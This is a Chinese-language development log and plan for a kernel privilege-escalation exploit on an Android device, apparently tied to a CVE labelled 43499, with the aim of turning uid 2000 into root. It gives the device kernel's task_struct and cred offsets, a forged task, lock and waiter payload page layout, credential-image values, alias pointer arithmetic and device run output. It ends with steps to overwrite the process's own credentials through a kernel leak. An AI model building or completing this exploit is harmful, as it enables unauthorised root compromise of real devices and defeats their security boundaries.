# 43499 route 执行体 · 批次计划（L 级 · 待认可）

> 关系：与 `43499-prepare-step-plan.md`（准备阶段，已 status=ok）**互补不重复**；本批＝进度文档里的「**序 1 接线**」。
> **修正（2026-10-11）**：初稿写"缺 controller/写路径"**不成立** —— B1 已交付引擎 `seam/multicast_route*`，
> 其 `MulticastRoute::execute()` 注释明写 *"starts the three actors, performs the requeue"*。故本批**范围缩小为接线**。

## 一、目标（简）

让 43499 的 w1/w2/w3 真跑（已达成 ✓）并用它拿到 root（进行中）。证据与边界见 device-gates 归档与 §三十三 起。

## 三十三、为拿 root：真值已进配置（2026-10-11 晚）

- 找到退役树里**本机内核自己的 profile**（release 字符串与设备逐字相同）：
  `app/src/main/assets/profile/5.15.189-android13-8-00016-g51bba4309aac-ab14546557.conf`。
- 已把它的**非密钥**字段灌进 43499 全部夹具的 `abi` 段（原先全是 0 占位）：
  - `task_struct`: prio/normal_prio/sched_task_group/pi_lock/pi_waiters/pi_top_task/pi_blocked_on/pid/tgid/
    atomic_flags/real_cred=1936/cred=1944/comm/tasks/seccomp；
  - `cred`: caps_offset=48 / ref0..3_offset=128..152 / ref_count=4 / copy_size=176 / usage_value=256 /
    caps_count=3 / caps_value=0x1ffffffffff / ref*_image（负的镜像地址 ⇒ 按二补数存 u64，换算已注明）；
  - `offset`: init_task / init_cred / empty_zero_page / root_task_group / selinux_*；
  - `route.multicast_waiter.*` 与退役 profile **逐字段一致**（96/264/48/56）⇒ 几何此前就对 ✓。
- 设备复核：链仍 `w1/w2/w3 => won`、`verdict none` ⇒ 但 **`after uid=2000`** ⇒ 真值尚未被使用。

### 拿 root 还缺的两件（下一批的骨架）

1. **把凭据图像接进写路径**：`memory/credential_image`（本树已有 ✓ 测试在门禁里）把 `copy_size=176` 的凭据
   写进载荷缓冲区 ✓ —— 现在链里没有这一步；
2. **给写一个真 target**：`target` 必须是内核里**我们自己的凭据**（或其 uid 字段）。地址来源是 43499 的
   **泄漏**（这正是这条 CVE 的本体 ✓）+ 内核滑动（profile 的 `slide_*` 锚点）。

⇒ root 的证明要在 1+2 之后才有意义：把 `after uid=` 从 2000 变成 **0**（并给出同一行的原始输出）。

## 三十四、拿 root 的完整配方（数已全部到手，下一轮照此实现）

### 载荷那一页的摆放（退役 `spray.cpp:305-325` 逐条）

```
payload_base  = prepare_base + payload_delta          // 多播：SKB_DATA_DELTA = -0xe80
fake_lock     = payload_base + LOCK_OFF   (0x0e80)
fake_w0/fake_w1 = payload_base + W0_OFF   (0x1180)
fake_task     = payload_base + FAKE_TASK_OFF (0x1280)
default_fops  = payload_base + FOPS_TABLE_OFF (0x0f80)
credential    = payload_base + CRED_COPY_OFF (0x1080)   // copy_size = 176（profile）
```

### 页内字段偏移（本机内核自己的 profile 覆盖退役常数）

- **伪造 task**（`TaskFields`，task 相对）：`usage`（退役 0x40）/ `prio=124` / `normal_prio=132` /
  `group=1024` / `pi_lock=2180` / `pi_waiters=2200` / `pi_top_task=2216` / `pi_blocked_on=2224`（后七项=设备 profile ✓）；
- **伪造 waiter**（`WaiterFields`）：tree_prio 0x18 / deadline 0x20 / pi_tree_entry 0x28 / pi_tree_prio 0x40 /
  pi_tree_deadline 0x48 / task 0x50 / lock 0x58 / wake_state 0x60 / ww_ctx 0x68（退役常数，内核无关）；
- **伪造锁**（`LockFields`）：`+0x18` 指回 `fake_task | 1`（链上第一个字）✓；
- **值**（`PayloadValues`：`task_prio=120`、`waiter_prio=140`（退役常数：waiter 必须压过它等的对象、task 必须高于实时阈值）✓。
  ⚠️ 注意区分：profile 的 `task_struct.prio = 124` 是**结构偏移**，而 `PayloadValues.task_prio = 120` 是**写入的值** ✓；
- **凭据**（`CredentialLayout`，全部来自 profile ✓）：`copy_size=176` / `usage_value=256` / `caps_offset=48` /
  `caps_count=3` / `caps_value=0x1ffffffffff` / `ref0..3_offset=128..152` / `ref*_image`（4 个镜像地址）✓。

### 实现顺序（每步可单独验）

1. 把上面这组数补成 **wire 键**（`route.multicast_waiter.payload.*` + `abi.task_fields.*`），schema 同批登记；
2. main：`payload_delta` 算出 `payload_base` ⇒ 填 `PayloadPageInputs` ⇒ `build_payload_page` ⇒ 具名拒绝优先；
3. 把 `fake_task`/`fake_lock` 喂给引擎配置（**替换**现在"准备区 + 位移"的推导 ✗），`target` = 泄漏到的地址；
4. 设备跑 ⇒ 判据仍是那一条：**`after uid=` 从 2000 变 0**，并给出同一行原始输出。

## 三十六、哨兵实验结果（否定，但指路）

- 实验：把绝对指针换成"泄漏候选当别名基址"，用页内第一个等待字当哨兵，写入前后比对。

```
main: sentinel before=1 after=1      ← 内核没动我们那页 ⇒ 别名不成立（用 we leak 的地址当基址 ✗）
main: payload page at 0x71a276b130  ← 我们页是用户态地址
main: prepare base=0xffff800000018000 / snitch found=0xffff800000018800   ← 准备那一段的两个地址都在**内核域**，且只差 0x800
```

- 解读：**准备阶段那块区本来就在内核可见域**（搜索就是在内核地址空间里找到我们的字 ✓），
  所以载荷页应当放进**那块区**，而不是放进我另建的 `WordsRegion`（两者是不同内存 ⇒ 内核永远不会读我们那页 ✗）。
- 下一步（据此定）：让准备执行体**把它的区交给调用方**（与 `WordsRegion` 同一套归属规则 ✓），载荷页按
  `payload_base = prepare_base + delta` 落进去；哨兵再量一次：`after` 应**不等于** 1。

## 三十七、别名锚点纠正 + 一处明确的算术错位（下一步唯一要改的地方）

- **锚点纠正（已落码 ✓）**：别名增量必须用**那个字本身**当锚点 ——
  `alias_delta = 搜索报出的字地址 − 我们在用户态写的那个字的地址`（两者都是已知量 ✓）。
  此前用"找到的对象 − 我们页基址"是错的 ✗。
- 设备现状（本轮的运行）：`fake_task/fake_lock` 已落在内核域（`0xffff8000000…` ✓），
  但哨兵 `before=1 after=1` ⇒ 内核仍未动我们那页。
- **明确的算术错位（下一步唯一要改的）**：页的**内容**写在"区域 + 48K 的载荷区" ✓，
  而指针基址我按"区域 − delta"算 ✗ ⇒ 指针与内容差着地方。
  正确式：`payload_base = alias_delta + (uint64)载荷区地址` ✓（退役的 `delta` 是因为人家的页基址就是准备区基址，
  我们这里页本就是区内的载荷区 ✓）。
- 判据不变：哨兵 `after` **不等于** 1 ⇒ 别名与落点都对了；随后才是 `after uid=0` ✓。

## 三十八、布局对齐（结构性进展）+ 我自己的哨兵判据是错的

- 修复：页内指针曾被**加了两次别名** ✗ ⇒ 去重后设备输出逐项吻合退役布局：

```
payload page at 0xffff80000006d800
fake_task=0xffff80000006ea80  (−page = 0x1280 = FAKE_TASK_OFF ✓)
fake_lock=0xffff80000006e680  (−page = 0x0e80 = LOCK_OFF ✓)
route status=0/0 attempts=2 calls=4 successes=4
```

- **但我的哨兵判据是错的** ✗：设计里**没有任何一步会往载荷页里写** —— 内核只是**读**它（走伪造任务/锁）✓，
  擦除写的是**内核侧那份戳记拷贝**（栈帧）✓，用户态看不见 ✓。所以"页内字节不变"**不能**证明写没发生 ✗。
- 结论：写成不成立的**唯一可信判据**是**效果**本身 —— `after uid=` 由 2000 变 0 ✓（退役代码同判：它也只认
  `consumer_success > 0` + 最终效果 ✓）。
- 下一步（据此重排）：
  1. `target` 取**我们自己凭据的地址**（读面：`init_task` → 任务链表 → 本进程 task → `cred` ✓；
     读不动就先用 profile 的 `init_cred` 别名试 ✓）；
  2. 载荷页里的凭据图像装上去 ⇒ 量 `after uid=` ✓；
  3. 哨兵改为"记数式证据"（记录每步的引擎数字 ✓），不再拿页内字节当判据 ✗。
